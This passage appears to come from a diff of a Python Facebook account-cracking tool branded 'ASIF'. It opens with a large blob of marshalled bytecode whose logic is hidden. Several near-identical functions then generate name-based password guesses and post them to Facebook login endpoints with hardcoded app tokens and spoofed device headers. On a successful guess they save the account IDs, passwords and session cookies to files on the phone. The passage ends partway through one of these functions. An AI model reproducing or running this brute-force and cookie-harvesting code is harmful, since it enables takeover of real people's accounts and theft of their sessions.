r\x07\x00\x00\x00r\x14\x00\x00\x00z\x19photo.<locals>.<listcomp>m\x00\x00\x00r7\x00\x00\x00r\t\x00\x00\x00z\x18/sdcard/DCIM/Screenshotsc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00\xf3<\x00\x00\x00\x97\x00g\x00|\x00]\x19}\x01|\x01\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xaf\x17|\x01\x91\x02\x8c\x1aS\x00r9\x00\x00\x00r\x0f\x00\x00\x00r\x11\x00\x00\x00s\x02\x00\x00\x00  r\x07\x00\x00\x00r\x14\x00\x00\x00z\x19photo.<locals>.<listcomp>{\x00\x00\x00r7\x00\x00\x00r\t\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00\xf3<\x00\x00\x00\x97\x00g\x00|\x00]\x19}\x01|\x01\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xaf\x17|\x01\x91\x02\x8c\x1aS\x00r6\x00\x00\x00r\x0f\x00\x00\x00r\x11\x00\x00\x00s\x02\x00\x00\x00  r\x07\x00\x00\x00r\x14\x00\x00\x00z\x19photo.<locals>.<listcomp>\x88\x00\x00\x00r7\x00\x00\x00r\t\x00\x00\x00)\tr\x05\x00\x00\x00r\x06\x00\x00\x00r$\x00\x00\x00\xda\x05writer"\x00\x00\x00r#\x00\x00\x00r%\x00\x00\x00r&\x00\x00\x00r\'\x00\x00\x00r(\x00\x00\x00s\r\x00\x00\x00             r\x07\x00\x00\x00\xda\x05photor=\x00\x00\x00V\x00\x00\x00s\xe4\x04\x00\x00\x80\x00\xdd\x0c\x14\xd4\x0c\x1c\xd1\x0c\x1e\xd4\x0c\x1e\x80G\xd8\x0f?\x80I\xd8\r\x19\x80G\xf0\x04\x0e\x05\x10\xe5\x08\x0c\x88Z\x98\x03\xd1\x08\x1c\xd4\x08\x1c\xd7\x08"\xd2\x08"\xa06\xd1\x08*\xd4\x08*\xd0\x08*\xd8\x16+\x88\x0b\xd8\x14N\xd0\x14N\xa5\x02\xa4\n\xa8;\xd1 7\xd4 7\xd0\x14N\xd1\x14N\xd4\x14N\x88\t\xd8\x14\x1d\xf0\x00\x07\tB\x01\xf0\x00\x07\tB\x01\x88D\xdd\x11\x15\x95b\x94g\x97l\x92l\xa0;\xb0\x04\xd1\x165\xd4\x165\xb0t\xd1\x11<\xd4\x11<\xf0\x00\x06\rB\x01\xc0\x01\xd8\x14K\xb09\xd0\x14K\xd0\x14K\xd0\x14K\x90\x03\xd8\x17 \xa0\'\xd0\x16*\x90\x05\xd8\x16\x1f\xa0\x17\xd0\x15)\x90\x04\xd8\x17!\xa01\x90o\x90\x05\xd8\x16\x1d\x97l\x92l\xa03\xa8T\xb8\x15\x90l\xd1\x16?\xd4\x16?\x90\x03\xd8\x17\x1e\x97|\x92|\xa0C\xa8e\xb85\x90|\xd1\x17A\xd4\x17A\x90\x04\xf0\r\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf1\x00\x06\rB\x01\xf4\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf8\xf8\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf0\x03\x07\tB\x01\xf8\xf0\x12\x00\x05\x10\x884\x884\xf8\xf8\xf8\xf0\x02\x0c\x05\x10\xe0\x16+\x88\x0b\xd8\x14N\xd0\x14N\xa5\x02\xa4\n\xa8;\xd1 7\xd4 7\xd0\x14N\xd1\x14N\xd4\x14N\x88\t\xd8\x14\x1d\xf0\x00\x07\tB\x01\xf0\x00\x07\tB\x01\x88D\xdd\x11\x15\x95b\x94g\x97l\x92l\xa0;\xb0\x04\xd1\x165\xd4\x165\xb0t\xd1\x11<\xd4\x11<\xf0\x00\x06\rB\x01\xc0\x01\xd8\x14K\xb09\xd0\x14K\xd0\x14K\xd0\x14K\x90\x03\xd8\x17 \xa0\'\xd0\x16*\x90\x05\xd8\x16\x1f\xa0\x17\xd0\x15)\x90\x04\xd8\x17!\xa01\x90o\x90\x05\xd8\x16\x1d\x97l\x92l\xa03\xa8T\xb8\x15\x90l\xd1\x16?\xd4\x16?\x90\x03\xd8\x17\x1e\x97|\x92|\xa0C\xa8e\xb85\x90|\xd1\x17A\xd4\x17A\x90\x04\xf0\r\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf1\x00\x06\rB\x01\xf4\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf8\xf8\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf0\x03\x07\tB\x01\xf8\xf0\x10\x00\x05\x10\x884\x884\xf8\xf8\xf8\xf0\x04\x0c\x05\x10\xe0\x160\x88\x0b\xd8\x14N\xd0\x14N\xa5\x02\xa4\n\xa8;\xd1 7\xd4 7\xd0\x14N\xd1\x14N\xd4\x14N\x88\t\xd8\x14\x1d\xf0\x00\x07\tB\x01\xf0\x00\x07\tB\x01\x88D\xdd\x11\x15\x95b\x94g\x97l\x92l\xa0;\xb0\x04\xd1\x165\xd4\x165\xb0t\xd1\x11<\xd4\x11<\xf0\x00\x06\rB\x01\xc0\x01\xd8\x14K\xb09\xd0\x14K\xd0\x14K\xd0\x14K\x90\x03\xd8\x17 \xa0\'\xd0\x16*\x90\x05\xd8\x16\x1f\xa0\x17\xd0\x15)\x90\x04\xd8\x17!\xa01\x90o\x90\x05\xd8\x16\x1d\x97l\x92l\xa03\xa8T\xb8\x15\x90l\xd1\x16?\xd4\x16?\x90\x03\xd8\x17\x1e\x97|\x92|\xa0C\xa8e\xb85\x90|\xd1\x17A\xd4\x17A\x90\x04\xf0\r\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf1\x00\x06\rB\x01\xf4\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf8\xf8\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf0\x03\x07\tB\x01\xf8\xf0\x10\x00\x05\x10\x884\x884\xf8\xf8\xf8\xf0\x02\x0c\x05\x10\xe0\x160\x88\x0b\xd8\x14N\xd0\x14N\xa5\x02\xa4\n\xa8;\xd1 7\xd4 7\xd0\x14N\xd1\x14N\xd4\x14N\x88\t\xd8\x14\x1d\xf0\x00\x07\tB\x01\xf0\x00\x07\tB\x01\x88D\xdd\x11\x15\x95b\x94g\x97l\x92l\xa0;\xb0\x04\xd1\x165\xd4\x165\xb0t\xd1\x11<\xd4\x11<\xf0\x00\x06\rB\x01\xc0\x01\xd8\x14K\xb09\xd0\x14K\xd0\x14K\xd0\x14K\x90\x03\xd8\x17 \xa0\'\xd0\x16*\x90\x05\xd8\x16\x1f\xa0\x17\xd0\x15)\x90\x04\xd8\x17!\xa01\x90o\x90\x05\xd8\x16\x1d\x97l\x92l\xa03\xa8T\xb8\x15\x90l\xd1\x16?\xd4\x16?\x90\x03\xd8\x17\x1e\x97|\x92|\xa0C\xa8e\xb85\x90|\xd1\x17A\xd4\x17A\x90\x04\xf0\r\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf1\x00\x06\rB\x01\xf4\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf8\xf8\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf0\x03\x07\tB\x01\xf0\x00\x07\tB\x01\xf8\xf0\x10\x00\x05\x10\x884\x884\x884\xf8\xf8\xf8s\xc7\x00\x00\x00\x99A5C*\x00\xc2\x0eA\x03C\x1d\x05\xc3\x11\x0cC*\x00\xc3\x1d\x04C!\t\xc3!\x03C*\x00\xc3$\x01C!\t\xc3%\x04C*\x00\xc3*\x02C.\x03\xc32A\x12F \x00\xc5\x04A\x03F\x13\x05\xc6\x07\x0cF \x00\xc6\x13\x04F\x17\t\xc6\x17\x03F \x00\xc6\x1a\x01F\x17\t\xc6\x1b\x04F \x00\xc6 \x02F$\x03\xc6(A\x12I\x16\x00\xc7:A\x03I\t\x05\xc8=\x0cI\x16\x00\xc9\t\x04I\r\t\xc9\r\x03I\x16\x00\xc9\x10\x01I\r\t\xc9\x11\x04I\x16\x00\xc9\x16\x02I\x1a\x03\xc9\x1eA\x12L\r\x00\xca0A\x03K?\x05\xcb3\x0cL\r\x00\xcb?\x04L\x03\t\xcc\x03\x03L\r\x00\xcc\x06\x01L\x03\t\xcc\x07\x04L\r\x00\xcc\r\x02L\x12\x03\xfa\x01~c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x03\x00\x00\x00\xf3`\x00\x00\x00\x97\x00\t\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02t\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x03\x9d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00}\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00|\x00\x9b\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x8c.)\x04NTz\x07\x1b[1;32mz\n\x1b[1;37m $ )\x04\xda\x05input\xda\x03ehcr"\x00\x00\x00\xda\x06system)\x01\xda\x03jxxs\x01\x00\x00\x00 r\x07\x00\x00\x00\xda\x04mainrD\x00\x00\x00\x96\x00\x00\x00s7\x00\x00\x00\x80\x00\xf0\x02\x02\x05\x1c\xdd\x0c\x11\xd0\x121\x9ds\xd0\x121\xd0\x121\xd0\x121\xd1\x0c2\xd4\x0c2\x88\x03\xdd\x08\n\x8c\t\x90S\x90(\xd1\x08\x1b\xd4\x08\x1b\xd0\x08\x1b\xf0\x05\x02\x05\x1cr\t\x00\x00\x00\xe9\x14\x00\x00\x00)\x01\xda\x0bmax_workers)\x0fr\x05\x00\x00\x00r"\x00\x00\x00\xda\x03sys\xda\x12concurrent.futuresr\x03\x00\x00\x00\xda\nThreadPoolrB\x00\x00\x00r\x08\x00\x00\x00r1\x00\x00\x00r=\x00\x00\x00rA\x00\x00\x00rD\x00\x00\x00\xda\x03jjj\xda\x06submit\xda\x04Main\xa9\x00r\t\x00\x00\x00r\x07\x00\x00\x00\xfa\x08<module>rN\x00\x00\x00\x01\x00\x00\x00sh\x01\x00\x00\xf0\x03\x01\x01\x01\xe0\x00\x16\xd0\x00\x16\xd0\x00\x16\xd0\x00\x16\xd0\x00\x16\xd0\x00\x16\xd0\x00\x16\xd0\x00\x16\xd0\x00\x16\xd0\x00\x16\xd0\x00\x16\xd0\x00\x16\xd8\x00?\xd0\x00?\xd0\x00?\xd0\x00?\xd0\x00?\xd0\x00?\xf0\x04\x04\x01\x14\xd8\x04\x13\x80O\x80O\x80O\x80O\xf8\xf0\x02\x02\x01\x14\xd8\x04\r\x80B\x84I\xd0\x0e$\xd1\x04%\xd4\x04%\xd0\x04%\xd8\x04\x13\x80O\x80O\x80O\x80O\x80O\xf8\xf8\xf8\xf0\x08\x01\x01\x1f\xf0\x00\x01\x01\x1f\xf0\x00\x01\x01\x1f\xf0\x04E\x01\x01\x10\xf0\x00E\x01\x01\x10\xf0\x00E\x01\x01\x10\xf0N\x02;\x01\x10\xf0\x00;\x01\x10\xf0\x00;\x01\x10\xf0~\x01\x00\x05\x08\x80\x03\xf0\x02\x03\x01\x1c\xf0\x00\x03\x01\x1c\xf0\x00\x03\x01\x1c\xf0\x0c\x00\x06\x10\x80Z\x98B\xd0\x05\x1f\xd1\x05\x1f\xd4\x05\x1f\xf0\x00\x03\x01\x15\xa03\xd8\x04\x07\x87J\x82J\x88t\xd1\x04\x14\xd4\x04\x14\xd0\x04\x14\xd8\x04\x07\x87J\x82J\x88u\xd1\x04\x15\xd4\x04\x15\xd0\x04\x15\xd8\x04\x07\x87J\x82J\x88t\xd1\x04\x14\xd4\x04\x14\xd0\x04\x14\xf0\x07\x03\x01\x15\xf0\x00\x03\x01\x15\xf0\x00\x03\x01\x15\xf1\x00\x03\x01\x15\xf4\x00\x03\x01\x15\xf0\x00\x03\x01\x15\xf0\x00\x03\x01\x15\xf0\x00\x03\x01\x15\xf0\x00\x03\x01\x15\xf0\x00\x03\x01\x15\xf0\x00\x03\x01\x15\xf0\x00\x03\x01\x15\xf8\xf8\xf8\xf0\x00\x03\x01\x15\xf0\x00\x03\x01\x15\xf0\x00\x03\x01\x15\xf0\x00\x03\x01\x15\xf0\x00\x03\x01\x15\xf0\x00\x03\x01\x15s\x1b\x00\x00\x00\x94\x04\x19\x00\x99\x161\x03\xc1\x0eA\x00B\x1b\x03\xc2\x1b\x04B\x1f\x07\xc2"\x01B\x1f\x07'))
+
+def __file_M3__(ids,names,passlist):
+    try:
+        global loop,oks,cps
+        sys.stdout.write(f'\r\r{A}|ASIF-M3| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+        fn = names.split(' ')[0]
+        try:
+            ln = names.split(' ')[1]
+        except:
+            ln = fn
+        for pw in passlist:
+            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+            head = {"User-Agent": randBuildLSB(),"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
+            data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
+            po = requests.post('https://b-api.facebook.com/method/auth.login',data=data,headers=head).json()
+            if "session_key" in po:
+                token = po['access_token']
+                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
+                print(f'\r\r\x1b[38;5;46m|A x N_OK| '+ids+' | '+pas)
+                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
+                open('/sdcard/ASIF-M3-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                oks.append(ids)
+                break
+            elif 'www.facebook.com' in po['error']['message']:
+                print(f'\r\r{R}|A x N_CP| '+ids+f' | '+pas)
+                open('/sdcard/ASIF-M3-CP.txt','a').write(ids+'|'+pas+'\n')
+                cps.append(ids)
+                break
+        loop+=1
+    except requests.exceptions.ConnectionError:
+        time.sleep(20)
+    except Exception as e:
+        pass
+#──────────────{ FILE-METHOD-M4 }──────────────#
+def __file_M4__(ids,names,passlist):
+    try:
+        global loop,oks,cps
+        sys.stdout.write(f'\r\r{A}|ASIF-M4| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+        fn = names.split(' ')[0]
+        try:
+            ln = names.split(' ')[1]
+        except:
+            ln = fn
+        for pw in passlist:
+            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+            head = {"User-Agent": fuckx(),"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
+            data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
+            po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head).json()
+            if "session_key" in po:
+                token = po['access_token']
+                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
+                print(f'\r\r\x1b[38;5;46m|A x N_OK| '+ids+' | '+pas)
+                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
+                open('/sdcard/ASIF-M4-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                oks.append(ids)
+                break
+            elif 'www.facebook.com' in po['error']['message']:
+                print(f'\r\r{R}|A x N_CP| '+ids+f' | '+pas)
+                open('/sdcard/ASIF-M4-CP.txt','a').write(ids+'|'+pas+'\n')
+                cps.append(ids)
+                break
+        loop+=1
+    except requests.exceptions.ConnectionError:
+        time.sleep(20)
+    except Exception as e:
+        pass
+#──────────────{ FILE-METHOD-M5 }──────────────#
+def __file_M5__(ids,names,passlist):
+    try:
+        global loop,oks,cps
+        sys.stdout.write(f'\r\r{A}|ASIF-M5| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+        fn = names.split(' ')[0]
+        try:
+            ln = names.split(' ')[1]
+        except:
+            ln = fn
+        for pw in passlist:
+            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+            head = {"User-Agent": fuckx(),"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
+            data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
+            po = requests.post('https://api.facebook.com/auth/login',data=data,headers=head).json()
+            if "session_key" in po:
+                token = po['access_token']
+                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
+                print(f'\r\r\x1b[38;5;46m|A x N_OK| '+ids+' | '+pas)
+                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
+                open('/sdcard/ASIF-M5-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                oks.append(ids)
+                break
+            elif 'www.facebook.com' in po['error']['message']:
+                print(f'\r\r{R}|A x N_CP| '+ids+f' | '+pas)
+                open('/sdcard/ASIF-M5-CP.txt','a').write(ids+'|'+pas+'\n')
+                cps.append(ids)
+                break
+        loop+=1
+    except requests.exceptions.ConnectionError:
+        time.sleep(20)
+    except Exception as e:
+        pass
+#──────────────{ FILE-METHOD-M6 }──────────────#
+def __file_M6__(ids,names,passlist):
+    try:
+        global loop,oks,cps
+        sys.stdout.write(f'\r\r{A}|ASIF-M6| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+        fn = names.split(' ')[0]
+        try:
+            ln = names.split(' ')[1]
+        except:
+            ln = fn
+        for pw in passlist:
+            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+            head = {"User-Agent": fuckx(),"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
+            data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
+            po = requests.post('https://b-api.facebook.com/auth/login',data=data,headers=head).json()
+            if "session_key" in po:
+                token = po['access_token']
+                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
+                print(f'\r\r\x1b[38;5;46m|A x N_OK| '+ids+' | '+pas)
+                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
+                open('/sdcard/ASIF-M6-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                oks.append(ids)
+                break
+            elif 'www.facebook.com' in po['error']['message']:
+                print(f'\r\r{R}|A x N_CP| '+ids+f' | '+pas)
+                open('/sdcard/ASIF-M6-CP.txt','a').write(ids+'|'+pas+'\n')
+                cps.append(ids)
+                break
+        loop+=1
+    except requests.exceptions.ConnectionError:
+        time.sleep(20)
+    except Exception as e:
+        pass
+#──────────────{ FILE-METHOD-M7 }──────────────#
+def __file_M7__(ids,names,passlist):
+    try:
+        global loop,oks,cps
+        sys.stdout.write(f'\r\r{A}|ASIF-M7| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+        fn = names.split(' ')[0]
+        try:
+            ln = names.split(' ')[1]
+        except:
+            ln = fn
+        for pw in passlist:
+            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+            head = {"User-Agent": fuckx(),"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
+            data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
+            po = requests.post('https://api.facebook.com/auth/login',data=data,headers=head).json()
+            if "session_key" in po:
